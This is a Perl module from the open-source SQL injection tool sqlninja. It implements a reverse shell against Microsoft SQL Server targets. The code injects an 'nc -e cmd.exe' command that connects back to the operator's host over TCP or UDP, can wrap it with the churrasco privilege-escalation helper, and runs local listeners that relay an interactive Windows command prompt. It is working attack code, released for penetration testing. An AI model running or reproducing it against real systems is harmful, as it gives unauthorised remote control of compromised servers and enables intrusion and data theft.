# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Reverse tcp and udp shell
sub revshell
{	
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting revshell module\n";
	}
	my $lport;
	my $proto;
	
	$lport = 0;
	print "Local port: ";
	$lport = <STDIN>;
	chomp($lport);	
	# of course it must be a number
	while ($lport > 65535 or $lport < 1 or $lport !~ m/^\d+$/) {
		print "Port must be between 1 and 65535 (RFC 793, dude)\n";
		print "Local port: ";
		$lport = <STDIN>;
		chomp($lport);
	}
	while (($proto ne "tcp") and ($proto ne "udp") and ($proto ne "\x72\x6F\x63\x6B")) {
		print "tcp/udp [default: tcp]: ";
		$proto = <STDIN>;
		chomp($proto);
		if ($proto eq "") {
			$proto = "tcp";
		}
	}
	if ($proto eq "\x72\x6F\x63\x6B") {
		r();
		exit(0);
	}
	my $command;
	my $cmd;
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting listener process\n";
	}
	if ($proto eq "udp") {
		my $listenerpid = fork();
		if ($listenerpid == 0) {
			udplistener($lport);
			exit(0);
		}
		$cmd = "".$conf->{'uploaddir'}."\\nc -u -e cmd.exe ".$conf->{'lhost'}." ".$lport;
	} else {
		my $listenerpid = fork();
		if ($listenerpid) {
			tcplistener($lport);
			exit(0);
		}
		$cmd = "".$conf->{'uploaddir'}."\\nc -e cmd.exe ".$conf->{'lhost'}." ".$lport;
	}
	if ($conf->{'churrasco'} == 1) {
		$cmd = usechurrasco($cmd);
	}
	$command = createcommand($cmd);
	my $result = sendrequest($command);
}	

# Local server for tcp reverse shell
sub tcplistener 
{
	my $lport = $_[0];
	if ($conf->{'verbose'} == 1) {
		print "  [v] Creating local listening tcp socket\n";
	}
	my $server=IO::Socket::INET->new (Proto     => 'tcp',
					  LocalPort => $lport,	
					  Listen    => 1,
					  Reuse	    => 1)
		|| die "can't create local socket on port ".$lport.": $!";
	print "[+] waiting for shell on port ".$lport."/tcp...\n";

	my $client = $server->accept()
			|| die "can't establish connection with peer: $!";
	my $kidpid;
	die "can't fork: $!" unless defined($kidpid = fork());
	my $char;
	
	# this is needed to visualize the dos prompt even
	# if a newline is not present at its end
	local $/=\1;
	local $|=1; 

	# we receive the output here
	if ($kidpid != 0) {
		while (defined($char=<$client>)) {
			print $char;
		}
		kill ("TERM",$kidpid);
	} else {
		# and here we issue the commands
		while (defined ($char = <STDIN>)) {
			print $client $char;
		}
	}
	if ($conf->{'verbose'} == 1) {
		print "  [v] Closing listening socket\n";
	}
	close $server;
	close $client;
}

# Local server for udp reverse shell
sub udplistener 
{
	my $lport = $_[0];
	if ($conf->{'verbose'} == 1) {
		print "  [v] Creating local listening udp socket\n";
	}
	my $server=IO::Socket::INET->new (Proto	   => 'udp',
					 LocalPort => $lport)
		|| die "can't create local socket on port ".$lport.": $!";
	print "[+] waiting for shell on port ".$lport."/udp...\n";
	
	my $kidpid;
	my $char;
	local $/=\1;
	local $|=1;
	my $i;
	my $command;
	$server->recv($char,256);
	print $char;
	my ($pp,$aa);
	($pp,$aa) = sockaddr_in($server->peername);
	$kidpid = fork();
	if ($kidpid == -1) {
		die "can't fork: $!";
	}
	# child process........
	if ($kidpid == 0) {
		while (defined ($char = <$server>)) {
			print $char;
		}
	} 
	# parent process........
	else {
		while (defined ($char = <STDIN>)) {
			$char =~ s/\n/\r\n/g;
			$server->send($char);
			if ($char ne "\n") {
				$command = $command.$char;
			} else {
				if ($command eq "exit") {
					print "exiting.... \n";
					kill ("TERM",$kidpid);
					close $server;
					exit(0);
				} else {
					$command = "";
				}
			}
		}
	}
}

1;